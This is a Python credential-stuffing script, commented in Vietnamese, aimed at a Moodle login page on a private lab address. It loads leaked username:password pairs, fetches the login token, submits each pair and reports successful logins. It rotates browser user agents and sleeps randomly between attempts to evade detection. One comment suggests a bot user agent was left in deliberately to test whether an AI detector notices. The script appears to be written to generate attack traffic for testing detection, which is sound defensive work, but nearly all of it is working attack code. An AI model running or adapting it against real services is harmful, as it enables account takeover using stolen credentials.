import time
import random
import requests
from bs4 import BeautifulSoup

# --- CẤU HÌNH MỤC TIÊU ---
MOODLE_URL = "http://192.168.16.128/moodle"
LOGIN_URL = f"{MOODLE_URL}/login/index.php"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "python-requests/2.28.2" # Cố tình để hở 1 cái UA đặc trưng của bot để xem AI có bắt được không
]

def load_combos(filename="leaked_combos.txt"):
    combos = []
    try:
        with open(filename, "r") as f:
            for line in f:
                if ":" in line:
                    username, password = line.strip().split(":", 1)
                    combos.append((username, password))
    except FileNotFoundError:
        print(f"[-] Không tìm thấy file {filename}")
    return combos

def attempt_login(username, password):
    session = requests.Session()
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    
    try:
        # Lấy token trước khi gửi payload
        res = session.get(LOGIN_URL, headers=headers, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        token_input = soup.find('input', {'name': 'logintoken'})
        
        if not token_input:
            return False
            
        logintoken = token_input.get('value')
        
        login_data = {
            'username': username,
            'password': password,
            'logintoken': logintoken
        }
        
        print(f"[*] Attacking -> User: {username} | Pass: {password}")
        post_res = session.post(LOGIN_URL, data=login_data, headers=headers, timeout=10)
        
        if "loginerrormessage" in post_res.text:
            print("   [+] Kết quả: Thất bại (Đúng như kế hoạch).")
        else:
            print("   [!] BÁO ĐỘNG: Đăng nhập thành công! Bắt được tài khoản thật.")
            
    except Exception as e:
        print(f"[-] Lỗi kết nối: {e}")

def main():
    combos = load_combos()
    if not combos:
        return
        
    print(f"[i] Bắt đầu chiến dịch Credential Stuffing. Đã nạp {len(combos)} combos.")
    
    for username, password in combos:
        attempt_login(username, password)
        
        # Tàng hình: Ngủ từ 5 đến 15 giây giữa mỗi lần thử
        sleep_time = random.randint(5, 15)
        print(f"[i] Chờ {sleep_time} giây để tránh bị phát hiện...\n")
        time.sleep(sleep_time)
        
    print("[+] Chiến dịch hoàn tất.")

if __name__ == "__main__":
    main()